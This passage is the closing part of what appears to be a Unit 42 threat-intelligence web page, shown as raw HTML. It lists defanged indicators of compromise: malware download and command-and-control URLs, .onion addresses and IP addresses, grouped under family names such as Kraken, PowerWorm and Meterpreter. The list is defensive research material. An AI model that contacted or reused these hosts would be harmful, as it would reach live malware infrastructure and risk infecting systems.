1	hxxp://www[.]bcbs-arizona.org/s2.txt?u=
1	hxxp://www[.]bcbsarizona.org/s2.txt?u=</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9d5932015649-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9d5932015649-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9d5932015649-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9d5932015649-1"><span class="crayon-cn">7</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//54[.]213.195.138/s2.txt?u=</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9d5932015649-2"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]bcbs-arizona.org/s2.txt?u=</span></div><div class="crayon-line" id="crayon-60a9b96a2c9d5932015649-3"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]bcbsarizona.org/s2.txt?u=</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Downloader Kraken</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9d6840123265" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
5	hxxp://kulup[.]isikun.edu.tr/Kraken.jpg</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9d6840123265-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9d6840123265-1"><span class="crayon-cn">5</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//kulup[.]isikun.edu.tr/Kraken.jpg</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>PowerWorm</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9d7933245345" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
12	hxxp://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=
7	hxxp://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;uid=</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9d7933245345-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9d7933245345-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9d7933245345-1"><span class="crayon-cn">12</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9d7933245345-2"><span class="crayon-cn">7</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;uid=</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>AMSI Bypass</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9d8004200935" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
4	hxxp://35[.]165.38.15:80/login/process.php
1	hxxp://amazonsdeliveries[.]com:80/account/login.php
1	hxxp://35[.]164.97.4:80/admin/get.php
1	hxxp://162[.]253.133.189:443/login/process.php
1	hxxp://162[.]253.133.189:443/admin/get.php	</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9d8004200935-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9d8004200935-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9d8004200935-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9d8004200935-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9d8004200935-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9d8004200935-1"><span class="crayon-cn">4</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//35[.]165.38.15:80/login/process.php</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9d8004200935-2"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//amazonsdeliveries[.]com:80/account/login.php</span></div><div class="crayon-line" id="crayon-60a9b96a2c9d8004200935-3"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//35[.]164.97.4:80/admin/get.php</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9d8004200935-4"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//162[.]253.133.189:443/login/process.php</span></div><div class="crayon-line" id="crayon-60a9b96a2c9d8004200935-5"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//162[.]253.133.189:443/admin/get.php	</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><strong>Meterpreter RHTTP</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9da201558902" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
1	198[.]56.248.117
1	62[.]109.8.21
1	65[.]112.221.34
1	88[.]160.254.183</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9da201558902-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9da201558902-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9da201558902-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9da201558902-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9da201558902-1"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-cn">198</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-cn">56.248.117</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9da201558902-2"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-cn">62</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-cn">109.8.21</span></div><div class="crayon-line" id="crayon-60a9b96a2c9da201558902-3"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-cn">65</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-cn">112.221.34</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9da201558902-4"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-cn">88</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-cn">160.254.183</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><strong>Layers of Obfuscation</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9db109921403" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
1	hxxp://ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:8080/anSfrf</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9db109921403-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9db109921403-1"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:8080/anSfrf</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>SHA1 Hashtag</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9dc270258247" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
1	hxxp://212[.]83.186.207/?i=</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9dc270258247-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9dc270258247-1"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//212[.]83.186.207/?i=</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<h4><strong>Additional hashes to samples can be found <a href="https://github.com/pan-unit42/iocs/tree/master/psencmds">here</a>.</strong></h4>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" name="emailFormMask" value="">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>


        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2021 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","enable_video_popuping":"enable","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
